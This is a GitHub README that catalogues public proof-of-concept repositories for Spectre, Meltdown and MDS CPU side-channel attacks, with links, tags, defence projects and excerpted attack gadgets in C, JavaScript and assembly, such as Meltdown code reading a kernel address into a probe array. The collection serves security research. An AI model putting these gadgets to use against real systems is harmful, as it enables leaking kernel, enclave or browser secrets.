Collected from existing repos, this repo lists known Spectre-type, Meltdown-type and MDS-type PoCs.
PRs are welcome.

If you want to read corresponding codes, please checkout the branch [codes](https://github.com/morning21/Spectre_Meltdown_MDS_srcs/tree/codes).

```Bash
git clone -b codes https://github.com/morning21/Spectre_Meltdown_MDS_srcs.git
```

ToC:
<!-- MarkdownTOC -->

- [Collection](#collection)
  - [speed47/spectre-meltdown-checker](#speed47spectre-meltdown-checker)
  - [mniip/spectre-meltdown-poc](#mniipspectre-meltdown-poc)
  - [msmania/microarchitectural-attack](#msmaniamicroarchitectural-attack)
  - [adamalston/Meltdown-Spectre](#adamalstonmeltdown-spectre)
- [Spectre](#spectre)
  - [ErikAugust/spectre.c](#erikaugustspectrec)
  - [lsds/spectre-attack-sgx](#lsdsspectre-attack-sgx)
  - [opsxcq/exploit-cve-2017-5715](#opsxcqexploit-cve-2017-5715)
  - [cgvwzq/spectre](#cgvwzqspectre)
  - [amosbe/spectre-without-shared-memory](#amosbespectre-without-shared-memory)
  - [HexHive/SMoTherSpectre](#hexhivesmotherspectre)
  - [mmxsrup/CVE-2018-3639](#mmxsrupcve-2018-3639)
  - [Shuiliusheng/CVE-2018-3639-specter-v4-](#shuiliushengcve-2018-3639-specter-v4-)
- [Meltdown](#meltdown)
  - [IAIK/meltdown](#iaikmeltdown)
  - [feruxmax/meltdown](#feruxmaxmeltdown)
  - [Frichetten/meltdown-spectre-poc](#frichettenmeltdown-spectre-poc)
  - [paboldin/meltdown-exploit](#paboldinmeltdown-exploit)
  - [Semihalf/spectre-meltdown](#semihalfspectre-meltdown)
- [MDS](#mds)
  - [ZombieLoad](#zombieload)
  - [RIDL](#ridl)
- [Related](#related)
- [SgxPectre](#sgxpectre)
- [speculator](#speculator)
- [InvisiSpec](#invisispec)
- [STT](#stt)
- [SpectreGuard](#spectreguard)
  - [willyb321/meltdown-spectre-poc-grabber](#willyb321meltdown-spectre-poc-grabber)

<!-- /MarkdownTOC -->

# Collection
## speed47/spectre-meltdown-checker
* Link: [https://github.com/speed47/spectre-meltdown-checker.git](https://github.com/speed47/spectre-meltdown-checker.git)
* Description: Test whether the system is vulnerable to kinds of attacks.
* Tool: Shell + Docker
* Tags: All related CVEs

## mniip/spectre-meltdown-poc
* Link: [https://github.com/mniip/spectre-meltdown-poc](https://github.com/mniip/spectre-meltdown-poc)
* Tool: Makefile + C
* Tags: Kernel

## msmania/microarchitectural-attack
* Link: [https://github.com/msmania/microarchitectural-attack](https://github.com/msmania/microarchitectural-attack)
* Description: meltdown-toy, meltdown-full, spectre-toy, spectre-full

* Spectre

```ASM
Touch:
  movzx eax, byte [rcx]
  shl rax, 0Ch
  mov al, byte [rax+rdx]
  sysenter
```

## adamalston/Meltdown-Spectre
* Link: [https://github.com/adamalston/Meltdown-Spectre](https://github.com/adamalston/Meltdown-Spectre)

# Spectre
## ErikAugust/spectre.c
* Link: [https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6](https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6)
* Description: Original C Source
* Fork: [Eugnis/spectre-attack](https://github.com/Eugnis/spectre-attack), [crozone/SpectrePoC](https://github.com/crozone/SpectrePoC)
* Tool: C

```c
void victim_function(size_t x)
{
	if (x < array1_size)
	{
		temp &= array2[array1[x] * 512];
	}
}
```

## lsds/spectre-attack-sgx
* Link: [https://github.com/lsds/spectre-attack-sgx](https://github.com/lsds/spectre-attack-sgx)
* Tool: C
* Tags: SGX, enclave
* Description: Updated from ErikAugust/spectre.c. In enclave `ecall_victim_function`:

```c
void ecall_victim_function(size_t x, uint8_t * array2, unsigned int * outside_array1_size) {
	//if (x < array1_size) {
	if (x < *outside_array1_size) {
		 temp &= array2[array1[x] * 512];
	 }
}
```

## opsxcq/exploit-cve-2017-5715
* Link: [https://github.com/opsxcq/exploit-cve-2017-5715](https://github.com/opsxcq/exploit-cve-2017-5715)
* Description: Sending secrets at a relative realistic scenario, and observing secrets at page level.
* Tool: C

```c
void accessPage(int page) {
  int value=0;
  if (page < indexArraySize) {
    value = value & attackArray[indexArray[page] * PAGE_SIZE];
  }
}
```

## cgvwzq/spectre
* Link: [https://github.com/cgvwzq/spectre](https://github.com/cgvwzq/spectre)
* Fork: [ascendr/spectre-chrome](https://github.com/ascendr/spectre-chrome)
* Tool: C, JavaScript
* Description: Test whether a browser is vulnerable, extracted from [http://xlab.tencent.com/special/spectre/spectre_check.html](http://xlab.tencent.com/special/spectre/spectre_check.html)

```JavaScript
function vul_call(index, sIndex)
    {
        index = index |0;
        sIndex = sIndex |0;
        var arr_size = 0;
        var j = 0;
        junk = probeTable[0]|0;
        // "size" value repeated at different offsets to avoid having to flush it?
        j = (((sIndex << 12) | 0) +  sizeArrayStart)|0;
        arr_size = simpleByteArray[j|0]|0;
        if ((index|0) < (arr_size|0))
        {
            index = simpleByteArray[index|0]|0;
            index = (index << 12)|0;
            index = (index & ((TABLE1_BYTES-1)|0))|0;
            junk = (junk ^ (probeTable[index]|0))|0;
        }
    }
```

## amosbe/spectre-without-shared-memory
* Link: [https://github.com/amosbe/spectre-without-shared-memory](https://github.com/amosbe/spectre-without-shared-memory)
* Tool: C
* Description: Prime+Probe

## HexHive/SMoTherSpectre
* Link: [https://github.com/HexHive/SMoTherSpectre](https://github.com/HexHive/SMoTherSpectre)

```ASM
/* smother gadget */
asm("cmp $0, %%r15;"
    "je MARK;" ::: );
CRC324 CRC322
asm("movl $-1, %%r12d; divl %%r12d;" :::);
asm("MARK:;");
OR16
asm("lfence;" :::);
```

## mmxsrup/CVE-2018-3639
* Link: [https://github.com/mmxsrup/CVE-2018-3639.git](https://github.com/mmxsrup/CVE-2018-3639.git)
* Tool: C
* Description: Speculative Store Bypass

## Shuiliusheng/CVE-2018-3639-specter-v4-
* Link: [https://github.com/Shuiliusheng/CVE-2018-3639-specter-v4-](https://github.com/Shuiliusheng/CVE-2018-3639-specter-v4-)
* Tool: C
* Description: 3 kinds of victim gadgets

```c
void victim_function(size_t idx) {
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = public_key;
	tmp = probe[(*memory_slot)[idx] * 4096];
}
```

# Meltdown
## IAIK/meltdown
* Link: [https://github.com/IAIK/meltdown.git](https://github.com/IAIK/meltdown.git)
* Description: Discloser.
* Tool: C

## feruxmax/meltdown
* Link: [https://github.com/feruxmax/meltdown](https://github.com/feruxmax/meltdown)
* Description: Loading specific cache line during constructed exception.

```c
int speculative_transfer(int div, uint8_t secret)
{
    uint8_t data = 0;
    int res = 0;

    // rise_exception after delay
    int a=div;
    for(int i=0;i<100000;i++)
        a+=i;
    data = a / div;

    // speculative
    res += cache[CACHE_LINE_SIZE*secret];

    return res + data;
}
```

## Frichetten/meltdown-spectre-poc
* Link: [https://github.com/Frichetten/meltdown-spectre-poc](https://github.com/Frichetten/meltdown-spectre-poc)

```ASM
asm __volatile__ (
           ".global __speculative_byte_load_exit \n\t"
           "%=:                              \n"
           "xorq %%rax, %%rax                \n"
           "movb (%[ptr]), %%al              \n"
           "shlq $0xc, %%rax                 \n"
           "jz %=b                           \n"
           "movq (%[buf], %%rax, 1), %%rbx   \n"
           "__speculative_byte_load_exit:     \n"
           "nop                               \n"
           :
           :  [ptr] "r" (ptr), [buf] "r" (buf)
           :  "%rax", "%rbx");
```

## paboldin/meltdown-exploit
* Link: [https://github.com/paboldin/meltdown-exploit](https://github.com/paboldin/meltdown-exploit)
* Fork: [Digivill/Spectre-MeltDown-](https://github.com/Digivill/Spectre-MeltDown-)
* TODO: ASM

```asm
; rcx = kernel address
; rbx = probe array
retry:
mov al, byte [rcx]
shl rax, 0xc
jz retry
mov rbx, qword [rbx + rax]
```

## Semihalf/spectre-meltdown
* Link: [https://github.com/Semihalf/spectre-meltdown](https://github.com/Semihalf/spectre-meltdown)

```asm
__attribute__((noinline)) uint8_t bounds_check(uint64_t idx)
{
	if (idx < array_size) /* no reading outside the array, or is it? */
		return side_effects[base_array[idx] * PAGE_SIZE];
	return 0; /* just return 0 if index is out of range */
}
```

# MDS
## ZombieLoad
* Link: [https://github.com/IAIK/ZombieLoad.git](https://github.com/IAIK/ZombieLoad.git)

## RIDL
* Link: [https://github.com/vusec/ridl.git](https://github.com/vusec/ridl.git)

# Related

# SgxPectre
* Link: [https://github.com/OSUSecLab/SgxPectre.git](https://github.com/OSUSecLab/SgxPectre.git)

# speculator
* Link: [https://github.com/OSUSecLab/SgxPectre.git](https://github.com/OSUSecLab/SgxPectre.git)

# InvisiSpec
* Link: [https://github.com/mjyan0720/InvisiSpec-1.0.git](https://github.com/mjyan0720/InvisiSpec-1.0.git)
* Tool: Gem5

# STT
* Link: [https://github.com/cwfletcher/stt.git](https://github.com/cwfletcher/stt.git)
* Tool: Gem5
* Description: Taint Analysis

# SpectreGuard
* Link: [https://github.com/CSL-KU/SpectreGuard.git](https://github.com/CSL-KU/SpectreGuard.git)

## willyb321/meltdown-spectre-poc-grabber
* Link: [https://github.com/willyb321/meltdown-spectre-poc-grabber](https://github.com/willyb321/meltdown-spectre-poc-grabber)